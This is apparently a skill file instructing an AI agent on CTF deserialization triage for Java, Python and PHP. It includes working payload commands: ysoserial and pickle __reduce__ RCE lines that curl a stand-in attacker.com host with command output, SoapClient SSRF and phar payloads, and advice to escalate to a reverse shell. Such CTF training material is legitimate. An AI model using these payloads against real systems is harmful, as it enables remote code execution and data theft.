---
name: web-deserialization-triage
description: Triage CTF web targets for deserialization vulnerabilities in Java, Python, and PHP. Use when observing serialized data formats (base64 pickled objects, Java serialized streams, PHP phar files), gadget chain hints, or "object injection" language in challenge descriptions.
---

# Web Deserialization Triage

Use this skill to systematically identify and exploit deserialization vulnerabilities across Java, Python, and PHP stacks. Focus on evidence-first detection before attempting gadget chain exploitation.

## When to Use

- **Java**: Seeing `rO0AB` (base64) or `ACED` (hex) - Java serialized data
- **Python**: Observing `gASV` (base64) or `\x80\x04` (pickle protocol 4) - Pickled objects
- **PHP**: Finding `O:8:"stdClass"` or phar file uploads - PHP object injection
- **Common hints**: "object injection", "pickle", "serialization", "native data"

## Quick Start

```bash
# Detect serialization format
python3 .claude/skills/web-deserialization-triage/scripts/detect_ser.py \
  --input "gASVCgAAAAAAAACMBnN0cmluZ5Qu" --verbose

# Generate Java payload (ysoserial)
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang java --gadget CommonsCollections1 --cmd "curl http://attacker.com/?c=$(whoami)"

# Generate Python pickle payload
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang python --cmd "__import__('os').popen('id').read()"

# Test PHP object injection
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang php --class "SoapClient" --url "http://attacker.com:4444"
```

## Detection Phase

### Identify Serialization Format

| Format | Signature | Example |
|--------|-----------|---------|
| Java | `rO0AB`, `ACED` | `rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2s...` |
| Python Pickle | `gASV`, `\x80\x04`, `\x80\x05` | `gASVCgAAAAAAAACMBnN0cmluZ5Qu` |
| PHP | `O:length:"Class"` | `O:8:"stdClass":1:{s:4:"name";s:4:"test";}` |
| JSON | Plain object | `{"key": "value"}` (not vuln by default) |
| XML | `<object>` | Spring XML deserialization |

### Detection Commands

```bash
# Auto-detect format
python3 .claude/skills/web-deserialization-triage/scripts/detect_ser.py \
  --input "<suspicious_base64>"

# Check if data is pickle
python3 -c "import pickle, base64; print(pickle.loads(base64.b64decode('...')))"

# Check if data is Java serialized
python3 -c "
import base64
data = base64.b64decode('rO0AB...')
if data[:2] == b'\xac\xed':
    print('Java serialization stream detected')
"

# Check PHP serialization
python3 -c "
import re
data = 'O:8:\"stdClass\":1:{...}'
if re.match(r'^[OANSi]:\d+:', data):
    print('PHP serialization detected')
"
```

## Exploitation by Language

### Java (ysoserial)

**Detection:**
- Base64 starts with `rO0AB`
- Hex starts with `AC ED 00 05`
- HTTP headers: `Content-Type: application/x-java-serialized-object`

**Quick Test:**
```bash
# Generate CommonsCollections1 payload
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/?c=test'

# Via script
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang java --gadget CommonsCollections1 --cmd "nslookup attacker.com"
```

**Gadget Chain Priority:**
1. `CommonsCollections1-7` - Commons-collections library
2. `CommonsBeanutils1` - Commons-beanutils
3. `Jdk7u21` / `Jdk8u20` - Native JDK chains
4. `Rome` / `Spring1/2` - Framework specific

**Evidence to Collect:**
- Error messages mentioning `ClassNotFoundException`
- Stack traces showing `readObject()` or `ObjectInputStream`
- Library versions in classpath hints

### Python (Pickle)

**Detection:**
- Base64 starts with `gASV` (protocol 4+) or `Y3` (protocol 0-3)
- Raw bytes start with `\x80\x02`, `\x80\x04`, `\x80\x05`
- Seeing `pickle`, `cPickle`, `dill`, `cloudpickle` in code

**Quick Test:**
```bash
# Generate pickle RCE payload
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang python --cmd "__import__('os').system('curl http://attacker.com/?c=$(id)')"

# Manual test
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com',))
payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
"
```

**Alternative Libraries:**
- `dill` - Extended pickle protocol
- `cloudpickle` - Used in PySpark, Ray
- `PyYAML` - `!!python/object/execute` tag
- `jsonpickle` - JSON wrapper around pickle

**Evidence to Collect:**
- Python version (affects available modules)
- Imported libraries in source
- `__reduce__` or `__getstate__` implementations

### PHP (Object Injection)

**Detection:**
- Serialized string: `O:8:"ClassName":`
- `unserialize()` function calls
- `phar://` wrapper in file operations
- `SoapClient`, `SimpleXMLElement` classes

**Quick Test:**
```bash
# Basic PHP object injection
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang php --class "Exception" --msg "test"

# Phar deserialization via file operations
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang php-phar --gadget "file_exists" --file "phar://uploaded.jpg"

# SoapClient SSRF
python3 .claude/skills/web-deserialization-triage/scripts/gen_payload.py \
  --lang php --class "SoapClient" --url "http://127.0.0.1:8080/internal"
```

**Common Gadgets:**
- `GuzzleHttp\Cookie\FileCookieJar` - File write
- `Symfony\Component\Cache\Adapter\ApcuAdapter` - RCE
- `Laravel\PendingBroadcast` - RCE
- `SoapClient` - SSRF
- `SimpleXMLElement` - XXE

**Evidence to Collect:**
- PHP version (affects phar handling)
- Composer dependencies (vendor directory)
- Autoload files

## Workflow

1. **Fingerprint the target**
   - Identify language/framework
   - Look for serialization endpoints
   - Check for magic methods (`__wakeup`, `__destruct`, `__reduce`)

2. **Confirm deserialization**
   - Send benign serialized object
   - Observe if it's parsed/accepted
   - Check for type errors or object reconstruction

3. **Identify gadget chains**
   - List available libraries
   - Search for known gadgets
   - Test with DNS callback first

4. **Build minimal payload**
   - Start with simple command (`id`, `whoami`)
   - Verify execution via callback
   - Escalate to reverse shell if needed

5. **Extract flag**
   - Check standard locations
   - Use `find` or `cat` via RCE

## Decision Rules

- **If** seeing `rO0AB` → Java, try ysoserial gadgets
- **If** seeing `gASV` or `\x80\x04` → Python pickle, test `__reduce__`
- **If** seeing `O:length:"Class"` → PHP, check for magic methods
- **If** file upload allows `phar://` → PHP phar deserialization
- **If** error mentions `readObject` → Java, focus on library version
- **If** error mentions `pickle.loads` → Python, check for restrictions

## Output Discipline

Record:
- Serialization format detected
- Gadget chain used
- Payload encoding (base64, raw, etc.)
- Confirmation method (DNS, HTTP callback, output)
- Flag extraction command

## Tools Required

- `ysoserial.jar` - Java gadget chains
- Python `pickle`, `dill` modules
- PHP for generating phar files
- Callback server (`curl`, `nc`, Burp Collaborator)

## References

- [ysoserial](https://github.com/frohoff/ysoserial)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) - .NET version
- [PHPGGC](https://github.com/ambionics/phpggc) - PHP gadget chains
- [Pickle documentation](https://docs.python.org/3/library/pickle.html)
- [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
